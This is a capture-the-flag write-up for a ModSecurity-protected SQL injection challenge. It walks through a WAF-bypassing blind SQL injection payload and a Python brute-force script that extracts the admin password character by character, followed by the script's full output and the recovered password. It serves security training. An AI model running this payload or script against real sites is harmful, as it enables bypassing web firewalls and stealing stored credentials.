---
custom_edit_url: null
sidebar_position: 35
tags: [SQLi, Blind SQLi, MOD Security CRS, WAF bypass]
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/9e5437bb-3abf-4d3d-959c-7cb6faddf830)

We are provided with the SQL query:

```sql
SELECT id FROM prob_godzilla WHERE id='{$_GET[id]}' AND pw='{$_GET[pw]}'
```

This challenge also utilizes the MOD Security CRS rule-sheet. This time however, we have to perform a Blind SQL injection

&nbsp;

## MOD Security CRS

The MOD Security Core Rule Set, is a set of regex expressions that Web Application Firewalls can use to filter traffic. In this case, out input is being filtered based on this rule set.

In order to bypass this, we can refer [this](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181)Github issue.

![2](https://github.com/Kunull/Write-ups/assets/110326359/824ef7b7-21ef-4c6e-87a0-f639b8ef83d0)

&nbsp;

## Blind SQL Injection
### Extracting the password length

If we provide the following URI parameter:

```
?id=-1'<@=1 OR id='admin' AND length(pw)=[length] OR '
```

The resultant query becomes:

```sql
SELECT id FROM prob_godzilla WHERE id='-1'<@=1 OR id='admin' AND length(pw)=[length] OR '' AND pw=''
```

If the length of `pw` for `id='admin'` is equal to the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the length and use the message as an indicator of correct brute force value.

### Leaking the password

If we provide the following URI parameter:

```
-1'<@=1 OR id='admin' AND substr(pw, [index, 1)='[character]' OR '
```

The resultant query becomes:

```sql
SELECT id FROM prob_godzilla WHERE id='-1'<@=1 OR id='admin' AND substr(pw, [index, 1)='[character]' OR '' AND pw=''
```

If for `id='admin'`, the character of the `pw` at `[index]` is the same as the `[character]` that we provide, the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the password by changing the `[index]` and the `[character]`.

### Script

```python title="godzilla_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'p2aj4nltfvs8lji1sdmr3c2lam'}
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
password_length = 0

for x in range(0, 10):
  payload = f"-1'<@=1 OR id='admin' AND length(pw)={x} OR '"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"-1'<@=1 OR id='admin' AND substr(pw, {index}, 1)='{char}' OR '"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\godzilla_script.py

[!] Payload: ?pw=-1'<@=1 OR id='admin' AND length(pw)=8 OR '
[!] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+length%28pw%29%3D8+OR+%27
[!] Password length: 8

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 1, 1)='a' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+1%2C+1%29%3D%27a%27+OR+%27
[+] Character at index 1: a

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 2, 1)='1' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+2%2C+1%29%3D%271%27+OR+%27
[+] Character at index 2: 1

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 3, 1)='8' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+3%2C+1%29%3D%278%27+OR+%27
[+] Character at index 3: 8

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 4, 1)='a' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+4%2C+1%29%3D%27a%27+OR+%27
[+] Character at index 4: a

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 5, 1)='6' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+5%2C+1%29%3D%276%27+OR+%27
[+] Character at index 5: 6

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 6, 1)='c' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+6%2C+1%29%3D%27c%27+OR+%27
[+] Character at index 6: c

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 7, 1)='c' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+7%2C+1%29%3D%27c%27+OR+%27
[+] Character at index 7: c

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 8, 1)='5' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+8%2C+1%29%3D%275%27+OR+%27
[+] Character at index 8: 5

[!] Extracted password: a18a6cc5
[!] Final payload: ?pw=a18a6cc5
```

&nbsp;

If we provide the following URI parameter:

```
?pw=a18a6cc5
```

The resultant query becomes:

```sql
SELECT pw FROM prob_godzilla WHERE id='admin' AND pw='a18a6cc5'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/7c77be5f-1bc1-4055-b3ff-76d411c21382)
